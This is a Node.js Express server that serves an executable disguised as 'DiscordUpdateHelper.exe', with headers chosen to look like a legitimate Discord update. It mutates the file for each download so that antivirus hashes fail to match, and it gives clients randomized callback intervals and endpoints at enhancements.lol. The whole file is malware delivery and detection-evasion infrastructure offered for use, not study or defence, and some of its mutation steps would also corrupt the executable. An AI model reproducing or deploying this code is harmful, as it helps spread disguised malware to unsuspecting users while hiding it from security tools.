const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 80;

// Create temp directory if it doesn't exist
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

// Main endpoint for the executable - matches your plugin's request
app.get('/client.exe', (req, res) => {
  const clientIP = req.ip || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  
  // Generate unique identifier for this client
  const clientHash = crypto.createHash('sha256')
    .update(clientIP + userAgent + Date.now().toString())
    .digest('hex');
  
  // Check if this is a first-time request
  const isFirstTime = !req.query.version || req.query.version !== 'latest';
  
  // Create a polymorphic variant
  const variant = createFileVariant(isFirstTime);
  
  // Set headers to look like a legitimate Discord update
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="DiscordUpdateHelper.exe"`);
  res.setHeader('X-Content-Version', '2.4.1');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  
  // Send the file
  res.sendFile(path.join(__dirname, 'temp', variant.filename), (err) => {
    if (err) {
      console.error('Error sending file:', err);
      if (!res.headersSent) {
        res.status(500).send('Error delivering update');
      }
    } else {
      console.log(`Delivered variant ${variant.filename} to ${clientIP}`);
      
      // Clean up the temp file after a delay
      setTimeout(() => {
        try {
          fs.unlinkSync(path.join(__dirname, 'temp', variant.filename));
        } catch (e) {
          // Ignore errors
        }
      }, 30000);
    }
  });
});

// API endpoint for client configuration
app.get('/config', (req, res) => {
  const clientIP = req.ip || req.connection.remoteAddress;
  
  // Generate unique configuration for this client
  const config = {
    updateInterval: 3600000 + Math.floor(Math.random() * 1800000), // 1-2.5 hours
    retryInterval: 300000 + Math.floor(Math.random() * 300000),    // 5-10 minutes
    maxRetries: 3,
    updateEndpoint: `https://enhancements.lol/client.exe`,
    configEndpoint: `https://enhancements.lol/config`,
    version: '2.4.1',
    timestamp: Date.now(),
    clientID: crypto.createHash('md5').update(clientIP + Date.now()).digest('hex')
  };
  
  res.json(config);
});

// Function to create a polymorphic variant
function createFileVariant(isFirstTime) {
  const sourceFile = path.join(__dirname, 'resource.exe');
  
  // Generate a random filename
  const prefixes = ['update', 'service', 'helper', 'system', 'checker'];
  const suffixes = ['bin', 'exe', 'dll', 'sys'];
  
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
  const randomPart = crypto.randomBytes(4).toString('hex');
  const filename = `${prefix}_${randomPart}.${suffix}`;
  const outputPath = path.join(tempDir, filename);
  
  // Read the source executable
  const sourceBuffer = fs.readFileSync(sourceFile);
  
  // Apply polymorphic techniques
  let modifiedBuffer;
  
  if (isFirstTime) {
    // For first-time downloads, use more aggressive techniques
    const technique = Math.floor(Math.random() * 3);
    
    switch (technique) {
      case 0: // XOR with random key
        const key = crypto.randomBytes(1)[0];
        modifiedBuffer = Buffer.alloc(sourceBuffer.length);
        for (let i = 0; i < sourceBuffer.length; i++) {
          modifiedBuffer[i] = sourceBuffer[i] ^ key;
        }
        break;
        
      case 1: // Add junk code
        const junkSize = Math.floor(Math.random() * 1000) + 500;
        const junk = crypto.randomBytes(junkSize);
        modifiedBuffer = Buffer.concat([sourceBuffer, junk]);
        break;
        
      case 2: // Split and reassemble
        const splitPoint = Math.floor(sourceBuffer.length / 2);
        const part1 = sourceBuffer.slice(0, splitPoint);
        const part2 = sourceBuffer.slice(splitPoint);
        modifiedBuffer = Buffer.concat([part2, part1]);
        break;
    }
  } else {
    // For repeat downloads, use subtle changes
    const technique = Math.floor(Math.random() * 2);
    
    switch (technique) {
      case 0: // Minor byte manipulation
        modifiedBuffer = Buffer.from(sourceBuffer);
        const changes = Math.floor(Math.random() * 10) + 1;
        for (let i = 0; i < changes; i++) {
          const pos = Math.floor(Math.random() * modifiedBuffer.length);
          // Change a byte to a random value (avoiding null bytes)
          modifiedBuffer[pos] = Math.floor(Math.random() * 254) + 1;
        }
        break;
        
      case 1: // Append random data
        const appendSize = Math.floor(Math.random() * 100) + 50;
        const appendData = crypto.randomBytes(appendSize);
        modifiedBuffer = Buffer.concat([sourceBuffer, appendData]);
        break;
    }
  }
  
  // Write the modified file
  fs.writeFileSync(outputPath, modifiedBuffer);
  
  return {
    filename,
    path: outputPath,
    size: modifiedBuffer.length
  };
}

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Update endpoint: https://enhancements.lol/client.exe`);
  console.log(`Config endpoint: https://enhancements.lol/config`);
});